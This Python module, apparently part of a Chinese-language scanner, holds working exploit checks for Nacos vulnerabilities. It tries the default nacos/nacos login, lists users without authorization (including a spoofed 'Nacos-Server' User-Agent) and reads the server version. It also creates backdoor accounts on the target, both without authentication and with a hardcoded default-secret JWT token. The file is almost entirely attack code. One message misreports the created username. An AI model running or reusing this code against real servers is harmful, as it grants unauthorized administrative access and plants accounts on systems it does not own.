#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import json
import requests
import urllib3
from libs.public.outprint import OutPrintInfo
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}


class Qvd_2023_6271:
    def poc1(self,url):
        OutPrintInfo("NACOS","正在检测是否存在nacos默认口令")
        if url.endswith("/"):
            path = "nacos/v1/auth/users/login"
        else:
            path = "/nacos/v1/auth/users/login"
        data = {
            "username": "nacos",
            "password": "nacos"
        }
        checkpoc1 = requests.post(url=url + path, headers=head, data=data, verify=False)
        if checkpoc1.status_code == 200:
            OutPrintInfo("NACOS","存在默认口令username:[b bright_red]nacos[/b bright_red],password:[b bright_red]nacos[/b bright_red]")
        else:
            OutPrintInfo("NACOS","不存在默认口令")

    def poc2(self,url):
        OutPrintInfo("NACOS","正在检测是否存在未授权查看用户列表漏洞")
        if url.endswith("/"):
            path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
        else:
            path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
        checkpoc2 = requests.get(url=url + path, headers=head, verify=False)
        if "username" in checkpoc2.text:
            OutPrintInfo("NACOS",f"存在未授权访问漏洞,你可访问[b bright_red]{url + path}[/b bright_red]查看详细信息")
        else:
            OutPrintInfo("NACOS","不存在未授权访问漏洞")

    def poc3(self,url):
        OutPrintInfo("NACOS","正在检测是否存在任意用户添加漏洞")
        if url.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        data = {
            "username": "abcpq123",
            "password": "test123"
        }
        checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
        if "create user ok" in checkpoc3.text:
            OutPrintInfo("NACOS","用户[b bright_red]abcpq123[/b bright_red]添加成功，密码为[b bright_red]test123[/b bright_red]")
        else:
            OutPrintInfo("NACOS","不存在任意用户添加漏洞")

    def poc4(self,url):
        OutPrintInfo("NACOS","正在检测是否存在默认JWT任意用户添加漏洞")
        if url.endswith("/"):
            path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
        else:
            path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
        data = {
            "username": "test2",
            "password": "test123"
        }
        checkpoc4 = requests.post(url=url + path, headers=head, data=data, verify=False)
        if "create user ok" in checkpoc4.text:
            OutPrintInfo("NACOS","用户[b bright_red]test1[/b bright_red]添加成功，密码为[b bright_red]test123[/b bright_red]")
        else:
            OutPrintInfo("NACOS","不存在默认JWT任意用户添加漏洞")
    def poc5(self,url):
        OutPrintInfo("NACOS","正在检测是否存在默认JWT任意用户添加漏洞")
        if url.endswith("/"):
            path = "#/serviceSync"
        else:
            path = "/#/serviceSync"
        checkpoc5 = requests.get(url=url + path, headers=head, verify=False)
        if checkpoc5.status_code == 200:
            OutPrintInfo("NACOS",f"存在未授权漏洞,Url:[b bright_red]{url+path}[/b bright_red]")
        else:
            OutPrintInfo("NACOS","不存在未授权漏洞")
    def poc6(self,url):
        OutPrintInfo("NACOS","正在检测是否存在未授权查看用户列表漏洞利用点2")
        heads = {
            "User-Agent": "Nacos-Server",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        if url.endswith("/"):
            path = "nacos/v1/auth/users?pageNo=1&pageSize=9"
        else:
            path = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
        checkpoc2 = requests.get(url=url + path, headers=heads, verify=False)
        if "username" in checkpoc2.text:
            OutPrintInfo("NACOS",f"存在未授权访问漏洞,你可访问[b bright_red]{url + path}[/b bright_red]查看详细信息")
        else:
            OutPrintInfo("NACOS","不存在未授权访问漏洞")
    def poc7(self,url):
        OutPrintInfo("NACOS","正在检测Nacos版本信息")
        heads = {
            "User-Agent": "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
        }
        if url.endswith("/"):
            path = "nacos/v1/console/server/state?accessToken&username"
        else:
            path = "/nacos/v1/console/server/state?accessToken&username"
        checkpoc7 = requests.get(url=url + path, headers=heads, verify=False)
        if "version" in checkpoc7.text:
            res = json.loads(checkpoc7.text)
            OutPrintInfo("NACOS",f"Nacos版本信息:[b bright_red]{res['version']}[/b bright_red]")
        else:
            OutPrintInfo("NACOS","未找到Nacos版本信息")

    def main(self,target):
        url = target[0].strip('/ ')
        self.poc7(url)
        self.poc1(url)
        self.poc2(url)
        self.poc6(url)
        self.poc3(url)
        self.poc4(url)
        self.poc5(url)
